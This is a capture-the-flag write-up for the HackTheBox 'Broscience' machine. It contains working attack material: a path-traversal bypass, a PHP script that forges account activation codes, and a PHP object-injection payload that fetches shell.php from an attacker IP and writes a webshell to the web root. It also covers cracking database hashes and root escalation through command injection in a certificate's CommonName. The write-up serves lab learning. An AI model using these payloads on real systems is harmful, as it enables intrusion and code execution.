# HackTheBox Broscience

Initial Nmap top 1000 scans
```bash
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.54
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
```
Nmap full TCP port scan 65535
```bash
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
443/tcp   open     https
34304/tcp filtered unknown
```

One filtered port 34304

# https://broscience.htb

TECH stack php with apache2

usernames from site
bill		is admin = NO
administrator    is admin = YES
michael          is admin = NO
john             is admin = NO

Interesting finding from gobuster

https://broscience.htb/includes/
https://broscience.htb/activate.php
https://broscience.htb/includes/img.php?path=bench.png


# Foothold as www-data

The site is using images to display their workout pictures. That is calling from a url with the path parameter "http://broscience.htb/?path=imagName.jpg"
When we put the directory travesel payload something like this "../" in path parameter it will show a attack detected response. 

## LFI
So what we can do is bypass the fillter and read the arbitary files. I tried to double encode the payload "../index.php" and put the path parameter we got response back with the content of index.php file. I tried to get all of the site php file to my local machine for analyses some features we find.

We know there is an login and register functionilities.if we registered a new account 
We need to activate the account to login and use unfortunately we have no options to get the activation mail. So moving to the source file we find using path travesel vulnerability there is an activation.php file which show as to we need to get a code a 32bit code to activate the account aslo we can identify how it's generated the activation code from register.php file 

found the code to use the user profile activation it use time stamp 
so what we can do is Create a new user and grap the response timestamp to create a activation code using the following php code.

```php
<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    $t = 'Mon, 16 Jan 2023 04:46:24 GMT';
    srand(strtotime($t));
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}

$code = generate_activation_code();
echo $code; 

?>
```
Now we sucessfully activated and logged in

# RCE
Their is nothing much interesting we can do. The only thing we can do is change the theme to dark and light. we analayzed the source code to check how the theme is working we can see it use a custom cookie to maintain the theme in every section and cookie is created using php serilazed object also it cookie value is passed directily to unserilaze funtion without any validation so what we can do The code  has a potential unserialization vulnerability in the get_theme() function. The vulnerability lies in the fact that the value of the user-prefs cookie is unserialized without proper validation or sanitization, which could potentially allow an attacker to execute arbitrary code by crafting a malicious payload that is unserialized by the application

Analyze the code we can see a class name AvatarInterface to use save file on the server.Create a payload that creates an object of class AvatarInterface with the imgPath property set to a file path on the server and the tmp property set to a remote file containing malicious code. When the object is unserialized, the __wakeup() function would be called, and the malicious code would be written to the specified file path on the server, potentially allowing the attacker to execute arbitrary code with the permissions of the user running the web server.

Detailed view about php objectInjection from owasp
Referance [https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)


Created a paylod using this php code
```php
<?php

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp = 'http://10.10.16.10/shell.php'; //remote
    public $imgPath = '/var/www/html/shell.php'; //local file to save

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
function get_theme(){
         $up_cookie = base64_encode(serialize(new AvatarInterface()));
         echo $up_cookie;
}

get_theme();
//$up = unserialize(base64_decode(get_theme()));
//echo $up->theme;


?>
```
Uploaded a webshell and got the reverseShell

# User bill
Grap the postgresql creds from db_connect.php file and connected postgresql using psql.
dump users tables and collect all hashes
The application code is using md5 with a salt to converted the plaintext password to hash and stored in users tables
Cracked the hash and taking ssh as user "bill"

# Priveilage escalation

We found a shell script in the /opt directory named "renew_cert.sh." Reading that script, we can see it check the SSL CRT file as an argument to review the CRT file to see if it has expired within a day; if it has expired, it will take all the content parts of the CRT and put them into variables and create a new CRT using openssl. When the creation is finished, it copies the crt file to the bill cert directory in bill homes with the name $CommonName in the crt file.
Check the root process using pspy. We can see that a cron job will execute the script with an argument of "broscience.crt" from Bill Certs' directory.Furthermore, we are unable to run pspy as usual because it is causing our shell to hang. To resolve this issue, we use the -r flag in pspy to watch a specific directory.
So what we can do is create an SSL CRT file with a one-day expiration date and inject an OS command into the CommanName field of the SSL CRT. When the cron runs the script, it will move the file we specified in "commanName" and trigger our injection.

Creating ssl cerfiticate
```bash
openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days  1
```
mv the crt file to Certs diretory and wait a few seconds to run trigger the payload
We rooted the box sucessfully

